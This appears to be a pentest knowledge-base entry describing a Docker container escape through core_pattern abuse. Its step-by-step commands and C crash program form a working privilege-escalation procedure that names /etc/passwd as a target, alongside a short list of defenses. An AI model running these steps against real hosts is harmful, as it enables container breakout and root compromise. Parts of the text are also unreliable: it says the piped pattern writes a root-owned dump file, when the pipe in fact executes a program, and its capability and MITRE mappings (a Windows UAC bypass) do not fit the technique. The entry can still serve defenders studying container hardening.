---
id: d3972e53-1595-4a1d-82e4-aab73d844200
name: Abuse-Core-Dumps-and-Core-Pattern-for-Privilege-Escalation-in-Docker
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:17.162938+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Impact|TA0040 - Impact]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - '[[techniques/Inhibit System Recovery|T1490 - Inhibit System Recovery]]'
  - >-
    [[techniques/Abuse Elevation Control Mechanism|T1548 - Abuse Elevation
    Control Mechanism]]
sub_techniques:
  - >-
    [[sub-techniques/Bypass User Account Control|T1548.002 - Bypass User Account
    Control]]
tags:
  - '[[tags/Abusing coredumps and core_pattern]]'
  - '[[tags/Container - Docker Pentest]]'
  - '[[tags/Exploit privileged container abusing the Linux cgroup v1]]'
  - privilege-escalation
  - docker
  - linux
commands:
  - '[[commands/check-docker-overlay-mount]]'
  - '[[commands/set-core-pattern-pipe]]'
platforms:
  - Linux
  - Docker
tools: []
validated: true
---

# Abuse-Core-Dumps-and-Core-Pattern-for-Privilege-Escalation-in-Docker

## Summary

This procedure demonstrates how to escalate privileges within a privileged Docker container by abusing the Linux kernel's core dump mechanism and the core_pattern parameter. By modifying core_pattern to pipe core dumps to a writable location in the container's overlay filesystem and then triggering a crash, an attacker can write files with elevated permissions, potentially leading to root access or arbitrary file writes outside the container's isolation.

## Description

In Docker environments using overlay2 storage drivers (common in modern setups), the container's root filesystem is mounted as an overlay with a writable upperdir. Privileged containers often allow writing to /proc/sys/kernel/core_pattern, which controls how core dumps are handled. Setting core_pattern to pipe (using '|') to a program or file in the writable upperdir enables the kernel to execute or write dumps as root when a process crashes. This can be exploited to overwrite sensitive files or execute code with root privileges. The technique targets Linux cgroup v1 and is effective against misconfigured privileged containers. Success depends on the container having CAP_SYS_PTRACE or similar capabilities, and it can lead to full host compromise if the upperdir is accessible from the host.

## Requirements

1. Shell access to a running privileged Docker container (e.g., run with --privileged flag).
2. Ability to write to /proc/sys/kernel/core_pattern (common in privileged mode).
3. Access to gcc or another compiler for creating a crashing binary (or use pre-built alternatives).
4. Writable upperdir in the overlay filesystem (identifiable via mount output).
5. Linux kernel with core dump support enabled (default in most distributions).

## Defense

- Avoid using --privileged containers; use minimal capabilities instead (e.g., --cap-add=SYS_PTRACE only if necessary).
- Make /proc/sys/kernel/core_pattern read-only or immutable using sysctl or container security policies (e.g., AppArmor, SELinux).
- Disable core dumps entirely with ulimit -c 0 or kernel.core_pattern=/dev/null.
- Monitor for modifications to /proc/sys/kernel/core_pattern using auditd or container runtime hooks.
- Use Docker's seccomp profiles to restrict ptrace and core dump syscalls.
- Regularly audit container images for unnecessary privileges and use tools like Docker Bench for Security.

## Objectives

1. Identify the writable overlay upperdir in the Docker container's mount.
2. Modify core_pattern to redirect core dumps to a target file with root privileges.
3. Trigger a segmentation fault to generate a core dump, resulting in arbitrary root-owned file writes.
4. Achieve privilege escalation by overwriting critical files (e.g., /etc/passwd) or executing payloads.

## Instructions

### Step 1: Identify the Overlay Mount and Writable Upperdir

**Context**: Determine the container's filesystem mount type and locate the writable upperdir path, which is where core dumps can be directed for persistence outside the container's ephemeral layers.

**Command** ([[commands/check-docker-overlay-mount]]):
```bash
mount | head -n 1
```

> This command displays the root mount details. Look for 'overlay on /' with 'upperdir=' pointing to a path like /var/lib/docker/overlay2/<hash>/diff. Note this upperdir path (e.g., $_UPPERDIR_PATH) as it will be used in the next step. The output confirms the overlay2 driver and provides the exact writable location.

**Expected Output**:
```
overlay on / type overlay (rw,relatime,lowerdir=...,upperdir=/var/lib/docker/overlay2/<container-hash>/diff,workdir=...)
```

### Step 2: Set Core Pattern to Pipe to Writable Location

**Context**: Update /proc/sys/kernel/core_pattern to pipe core dumps to a file in the identified upperdir. The '|' prefix invokes a pipe to write the dump as root, allowing arbitrary file creation or overwrite in a location accessible post-container restart.

**Command** ([[commands/set-core-pattern-pipe]]):
```bash
echo "|$_UPPERDIR_PATH/poc" > /proc/sys/kernel/core_pattern
```

> Replace $_UPPERDIR_PATH with the upperdir from Step 1 (e.g., /var/lib/docker/overlay2/c51a87501842b287018d22e9d09d7d8dc4ede83a867f36ca199434d5ea5ac8f5/diff). This sets the kernel to pipe core dumps to './poc' in that directory upon crash. Verify with `cat /proc/sys/kernel/core_pattern` to confirm the change.

**Expected Output**:
```
|/var/lib/docker/overlay2/<hash>/diff/poc
```
(No output from echo, but cat confirms the pattern.)

### Step 3: Compile and Execute Crashing Program to Trigger Core Dump

**Context**: Create and run a simple program that causes a segmentation fault, triggering the kernel to generate a core dump piped to the target file with root privileges. This writes the dump (containing process memory) to the specified location, enabling further exploitation like injecting payloads into the dump file.

First, create the source file crash.c with the following content (use [[codes/simple-buffer-overflow-crash-c]] for reference):

```c
int main(void) {
    char buf[1];
    for (int i = 0; i < 100; i++) {
        buf[i] = 1;
    }
    return 0;
}
```

Then compile and execute:
```bash
gcc -o crash crash.c && ./crash
```

> The program overflows a 1-byte buffer, causing a segfault. The core dump is generated and piped to poc in the upperdir. If gcc is unavailable, use alternatives like `kill -SEGV $$` for a simple crash, but the compiled binary ensures a full dump. Check the poc file afterward with `ls -l $_UPPERDIR_PATH/poc` to confirm root ownership and size.

**Expected Output**:
```
Segmentation fault (core dumped)
```
(The poc file will be created with root permissions, e.g., -rw-r--r-- 1 root root <size> poc)
